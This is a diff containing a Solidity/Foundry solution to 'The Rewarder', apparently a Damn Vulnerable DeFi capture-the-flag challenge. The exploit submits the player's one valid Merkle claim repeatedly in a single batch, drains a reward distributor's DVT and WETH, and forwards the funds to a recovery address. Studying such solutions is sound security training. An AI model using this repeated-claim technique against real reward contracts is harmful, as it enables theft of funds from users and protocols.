@@ -147,7 +147,43 @@ contract TheRewarderChallenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
-    function test_theRewarder() public checkSolvedByPlayer {}
+    function test_theRewarder() public checkSolvedByPlayer {
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+        (uint256 player_amount_0, uint256 player_index_0) = _findReward(0, player);
+        (uint256 player_amount_1, uint256 player_index_1) = _findReward(1, player);
+
+        uint256 count_dvt = dvt.balanceOf(address(distributor)) / player_amount_0;
+        Claim[] memory claims_dvt = new Claim[](count_dvt);
+        IERC20[] memory tokensToClaim_dvt = new IERC20[](count_dvt);
+        for (uint256 i = 0; i < count_dvt; i++) {
+            claims_dvt[i] = Claim({
+                batchNumber: 0,
+                amount: player_amount_0,
+                tokenIndex: 0,
+                proof: merkle.getProof(dvtLeaves, player_index_0)
+            });
+            tokensToClaim_dvt[i] = IERC20(address(dvt));
+        }
+        distributor.claimRewards({inputClaims: claims_dvt, inputTokens: tokensToClaim_dvt});
+
+        uint256 count_weth = weth.balanceOf(address(distributor)) / player_amount_1;
+        Claim[] memory claims_weth = new Claim[](count_weth);
+        IERC20[] memory tokensToClaim_weth = new IERC20[](count_weth);
+        for (uint256 i = 0; i < count_weth; i++) {
+            claims_weth[i] = Claim({
+                batchNumber: 0,
+                amount: player_amount_1,
+                tokenIndex: 0,
+                proof: merkle.getProof(wethLeaves, player_index_1)
+            });
+            tokensToClaim_weth[i] = IERC20(address(weth));
+        }
+        distributor.claimRewards({inputClaims: claims_weth, inputTokens: tokensToClaim_weth});
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
+    }
 
     /**
      * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
@@ -184,6 +220,25 @@ contract TheRewarderChallenge is Test {
         leaves = new bytes32[](BENEFICIARIES_AMOUNT);
         for (uint256 i = 0; i < BENEFICIARIES_AMOUNT; i++) {
             leaves[i] = keccak256(abi.encodePacked(rewards[i].beneficiary, rewards[i].amount));
+        }
+    }
+
+    function _findReward(uint256 tokenIndex, address account) private view returns (uint256 amount, uint256 index) {
+        require(tokenIndex == 0 || tokenIndex == 1, "Invalid tokenIndex");
+        string memory path;
+        if (0 == tokenIndex) {
+            path = "/test/the-rewarder/dvt-distribution.json";
+        } else {
+            path = "/test/the-rewarder/weth-distribution.json";
+        }
+        Reward[] memory rewards =
+            abi.decode(vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), path))), (Reward[]));
+        for (uint256 i; i < rewards.length; ++i) {
+            if (rewards[i].beneficiary == account) {
+                amount = rewards[i].amount;
+                index = i;
+                break;
+            }
         }
     }
 }
